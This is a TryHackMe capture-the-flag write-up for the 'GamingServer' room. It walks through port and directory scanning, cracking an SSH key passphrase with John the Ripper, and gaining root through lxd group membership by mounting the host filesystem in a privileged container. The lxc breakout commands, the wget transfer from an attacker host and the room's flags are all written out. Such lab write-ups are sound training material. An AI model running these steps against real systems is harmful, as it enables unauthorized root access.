## GamingServer - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/gamingserver)

<i>Can you gain access to this gaming server built by amateurs with no experience of web development and take advantage of the deployment system.</i>

**IP: 10.10.90.45**

**Replace [YOUR-THM-IP] with your own machine IP assigned by TryHackMe.**

---

## 📌 General Information

**Room Difficulty**: Easy  <br>

**Room Type**: Linux Privilege Escalation, Web, <br>

**Tools Used**: Nmap, Ffuf, John The Ripper<br>

**Author**: <br>

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/LOGO%20NEW.png"/>](https://github.com/mauzware)

[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## 🔍 Enumeration

- Starting off with Nmap and Ffuf.

  ```
  nmap -sC -sV -T5 -p- 10.10.90.45

  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   2048 34:0e:fe:06:12:67:3e:a4:eb:ab:7a:c4:81:6d:fe:a9 (RSA)
  |   256 49:61:1e:f4:52:6e:7b:29:98:db:30:2d:16:ed:f4:8b (ECDSA)
  |_  256 b8:60:c4:5b:b7:b2:d0:23:a0:c7:56:59:5c:63:1e:c4 (ED25519)
  80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
  |_http-server-header: Apache/2.4.29 (Ubuntu)
  |_http-title: House of danak
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  ```

  ```
  ffuf -u http://10.10.90.45/FUZZ -w /usr/share/wordlists/dirb/common.txt 
  .htpasswd               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 4929ms]
  .hta                    [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 4929ms]
  .htaccess               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 4932ms]
  index.html              [Status: 200, Size: 2762, Words: 241, Lines: 78, Duration: 49ms]
  robots.txt              [Status: 200, Size: 33, Words: 3, Lines: 4, Duration: 48ms]
  secret                  [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 47ms]
  server-status           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 47ms]
  uploads                 [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 50ms]
  :: Progress: [4614/4614] :: Job [1/1] :: 847 req/sec :: Duration: [0:00:08] :: Errors: 0 ::
  ```
  
- In source code of main page you can find valuable comment and in `/uploads` directory you'll find list, note and a meme. Download them all.

  ```<!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. -->```
  
- In `/secret` directory is a RSA key, download it as well.

  ```
  -----BEGIN RSA PRIVATE KEY-----
  Proc-Type: 4,ENCRYPTED
  DEK-Info: AES-128-CBC,82823EE792E75948EE2DE731AF1A0547
  
  [SNIP!]
  -----END RSA PRIVATE KEY-----
  ```

- Since we already have username and key, we just need a passphrase for SSH login. We will get that through john and login with SSH. For wordlist use the list we found in `/uploads`

  ```
  ssh2john id_rsa > key.hash

  john --wordlist=dict.lst key.hash 
  Using default input encoding: UTF-8
  Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
  Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
  Cost 2 (iteration count) is 1 for all loaded hashes
  Will run 2 OpenMP threads
  Press 'q' or Ctrl-C to abort, almost any other key for status
  letmein          (id_rsa)     
  1g 0:00:00:00 DONE (2025-05-14 20:34) 100.0g/s 22200p/s 22200c/s 22200C/s baseball..starwars
  Use the "--show" option to display all of the cracked passwords reliably
  Session completed. 
  
  chmod 600 id_rsa

  ssh -i id_rsa john@10.10.90.45
  Enter passphrase for key 'id_rsa': 
  Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-76-generic x86_64)
  
  [SNIP!]
  
  Last login: Mon Jul 27 20:17:26 2020 from 10.8.5.10
  john@exploitable:~$ whoami
  john
  john@exploitable:~$ id
  uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
  ```

---

## 🧍 User Privilege Escalation

- User flag is already there.

  ```
  john@exploitable:~$ pwd
  /home/john
  
  john@exploitable:~$ ls -al
  total 60
  drwxr-xr-x 8 john john  4096 Jul 27  2020 .
  drwxr-xr-x 3 root root  4096 Feb  5  2020 ..
  lrwxrwxrwx 1 john john     9 Jul 27  2020 .bash_history -> /dev/null
  -rw-r--r-- 1 john john   220 Apr  4  2018 .bash_logout
  -rw-r--r-- 1 john john  3771 Apr  4  2018 .bashrc
  drwx------ 2 john john  4096 Feb  5  2020 .cache
  drwxr-x--- 3 john john  4096 Jul 27  2020 .config
  drwx------ 3 john john  4096 Feb  5  2020 .gnupg
  drwxrwxr-x 3 john john  4096 Jul 27  2020 .local
  -rw-r--r-- 1 john john   807 Apr  4  2018 .profile
  drwx------ 2 john john  4096 Feb  5  2020 .ssh
  -rw-r--r-- 1 john john     0 Feb  5  2020 .sudo_as_admin_successful
  -rw-rw-r-- 1 john john    33 Feb  5  2020 user.txt
  drwxr-xr-x 2 root root  4096 Feb  5  2020 .vim
  -rw------- 1 root root 12070 Jul 27  2020 .viminfo
  
  john@exploitable:~$ cat user.txt 
  a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e
  ```
  
- Moving to escalation.

---

## 👑 Root Privilege Escalation

- OK, so here I spent a lot of time enumerating and trying to find any sort of exploitation, but couldn't. After googling for a while, I found that group `(lxd)` is our way to root, which I already saw after logging in but didn't know what it is.

  ```
  john@exploitable:~$ id
  uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
  
  john@exploitable:~$ which lxd
  /usr/bin/lxd
  
  john@exploitable:~$ which lxc
  /usr/bin/lxc
  ```
  
- Perfect, since target machine already has both `lxd` and `lxc` installed we can move to exploitation immediately.
  
- First, on your Kali, clone this repo and move to it. You will see inside a file `alpine-v3.13-x86_64-20210218_0139.tar.gz`, that's our way in.

  ```
  git clone https://github.com/saghul/lxd-alpine-builder.git
  cd lxd-alpine-builder
  ```

- If for some reason you don't have the image aka `.tar.gz` file, use `sudo ./build-alpine` and it will create alpine image for you.
  For me, it crashed when I used it due to missing key, but `.tar.gz` was already there so I could still exploit the machine as long as I have the image file.
  So remember, you can do the exploitation as long as you have image file, don't extract it nor anything, keep it as it is and move it to target machine.

- For simpler use, move the file somewhere else and change it's name.

  ```cp alpine-v3.13-x86_64-20210218_0139.tar.gz /path/to/wherever/alpine.tar.gz```

- We are still on our own machine, go to the directory where image file is and run Python HTTP server, then download the file to target machine with `wget`.

  ```
  ATACKER:
  python3 -m http.server 80

  TARGET:
  wget http://[YOUR-THM-IP]/alpine.tar.gz

  john@exploitable:~$ wget http://[YOUR-THM-IP]:80/alpine.tar.gz
  --2025-05-14 20:16:03--  http://[YOUR-THM-IP]2/alpine.tar.gz
  Connecting to [YOUR-THM-IP]:80... connected.
  HTTP request sent, awaiting response... 200 OK
  Length: 3259593 (3.1M) [application/gzip]
  Saving to: ‘alpine.tar.gz’
  
  alpine.tar.gz                 100%[==============================================>]   3.11M  3.70MB/s    in 0.8s    
  
  2025-05-14 20:16:04 (3.70 MB/s) - ‘alpine.tar.gz’ saved [3259593/3259593]
  
  john@exploitable:~$ ls
  alpine.tar.gz  user.txt
  ```

- Now the best part, exploitation. On target machine, these are the following commands I used, there's couple of different ways for exploitation, after them I'll post how it looked in action. Import then proceed with commands.

  ```
  lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias pwned
  lxc init pwned breakout -c security.privileged=true
  lxc config device add breakout mydev disk source=/ path=/mnt/root recursive=true
  lxc start breakout
  lxc exec breakout /bin/sh
  ```

  Now in action, I changed image file to `alpine.tar.gz` so I don't have to type all of these numbers.

  ```
  john@exploitable:~$ ls
  alpine.tar.gz  user.txt
  
  john@exploitable:~$ lxc image import alpine.tar.gz --alias pwned
  Image imported with fingerprint: [SNIP!]
  
  john@exploitable:~$ lxc init pwned backdoor -c security.privileged=true
  Creating backdoor
  
  john@exploitable:~$ lxc config device add backdoor hackroot disk source=/ path=/mnt/root recursive=true
  Device hackroot added to backdoor
  
  john@exploitable:~$ lxc start backdoor
  john@exploitable:~$ lxc exec backdoor /bin/sh
  ~ # whoami
  root
  ~ # cd /mnt/root/root
  /mnt/root/root # cat root.txt
  2e337b8c9f3aff0c2b3e8d4e6a7c88fc
  /mnt/root/root # 
  ```

- This is my first time doing this exploitation and it was so cool and so fun, loved it! 

---

## 🏁 Flags

- **User Flag**: `a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e`
- **Root Flag**: `2e337b8c9f3aff0c2b3e8d4e6a7c88fc`

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  `Escalating privileges, my first time exploiting LXD/LXC`

- What did I learn?
  `New awesome way of privilege escalation.`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
